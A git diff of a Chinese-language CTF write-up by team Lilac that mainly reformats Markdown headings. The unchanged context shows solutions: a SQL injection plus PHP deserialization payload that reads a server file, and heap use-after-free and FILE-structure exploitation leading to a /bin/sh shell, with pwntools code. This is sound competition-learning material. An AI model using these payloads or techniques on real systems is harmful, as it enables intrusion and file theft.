@@ -11,25 +11,26 @@ Team: Lilac
 - [reverse](#reverse)
 	- [beijing](#beijing)
 	- [blend](#blend)
-	- [advanced](#advanced(solved-after-ctf))
+	- [advanced](#advanced)
 - [crypto](#crypto)
 	- [hashcoll](#hashcoll)
-##misc
-###签到
+
+## misc
+### 签到
 无
-###clip
+### clip
 - 对damaged.disk分析可知包含png图片,提取图片得到了两张图片.
 - 修复png文件头, 对图片还原PS等,得到flag:
 `flag{0b008070-eb72-4b99-abed-092075d72a40}`
-##web
-###facebook
+## web
+### facebook
 利用点: **sql注入+反序列化+LFR**
 payload:
 ```html
 /view.php?no=0/*123*/UniOn/*123*/select/*123*/0,1,2,%22O:8:\%22UserInfo\%22:3:{s:4:\%22name\%22;s:5:\%22lilac\%22;s:3:\%22age\%22;i:0;s:4:\%22blog\%22;s:29:\%22file:///var/www/html/flag.php\%22;}%22
 ```
-##pwn
-###guess
+## pwn
+### guess
 - 程序把flag读在栈上，提供了栈溢出，但是有canary保护，看似没有其他漏洞了，很自然地想到了**ssp leak**，但是不知道栈地址。从程序提供3次输入机会想到可以先用got地址泄露libc，然后用libc上的environ泄露栈地址，然后算出得到的栈地址与flag的距离，最后拿flag，这个距离值是固定的，正好可以通过3次泄露完成。libc可以用各种工具拿到，测试时发现远程环境和本地相同.
 
 ```python
@@ -66,7 +67,7 @@ print p.recvuntil("***: ")
 print p.recvline()
 p.close()
 ```
-###blind
+### blind
 release功能释放堆块后没有把指针置0，可以change中再次使用，存在**uaf**漏洞，可以用来修改fd做fastbin attack，以为没有提供leak，所以各种hook函数就别想了。stdin，stdout，stderr地址都是以0x7f开头，可以通过错位实现劫持，这里选择了stderr，然后就可以修改全局数据的5个指针指向任意地址，我将4个指针指向了bss上的一块连续内存用来伪造io_file和vtable，第五个指向了stdout用来攻击file结构。程序留了后面，可以直接吧vtable中的函数指针全部设为它，用构造好的file结构体指针覆盖stdout，执行printf时程序就被劫持为system(“/bin/sh”)，伪造结构体时需要设置fp->lock指向一块值为0的内存。
 ```python
 from pwn import *
@@ -263,11 +264,11 @@ p.sendline(p64(0x602088))
 p.sendline("your token")
 p.interactive()
 ```
-##reverse
-###beijing
+## reverse
+### beijing
 本题静态分析即可,flag在data段上被打乱放置, 和程序的输出结果形成索引,  根据输出结果推算出flag为:
 `flag{amazing_beijing}`
-###blend
+### blend
 题目分析拿到的是个DOS/MBR boot sector, 根据之前做过的[CSAW逆向题](https://github.com/TechSecCTF/writeups/blob/master/CSAWQuals2017/realism/README.md)遇到过这种模式的题目,照着思路调试了一遍
 ```bash
 xxx@xx  ~/ctf/china/advanced  file main.bin 
@@ -350,7 +351,7 @@ print('flag{%s}' % flag)
 ```
 得到flag:
 `flag{mbr_is_funny__eh}`
-###advanced(solved after ctf)
+### advanced
 老年misc选手,看到输出得到加密后的flag:4b404c4b5648725b445845734c735949405c414d5949725c45495a51
 像是异或flag后的结果
 ```python
@@ -387,8 +388,8 @@ In [102]: for i in range(len(enc)):
 In [103]: print flag
 flag{d_with_a_template_phew}
 ```
-##crypto
-###hashcoll
+## crypto
+### hashcoll
 题目文件以及描述:Sometime, you wonder why you rEad the DescrIption Because it may contaIn something useless.
 nc 117.50.1.201 9999
 ```python
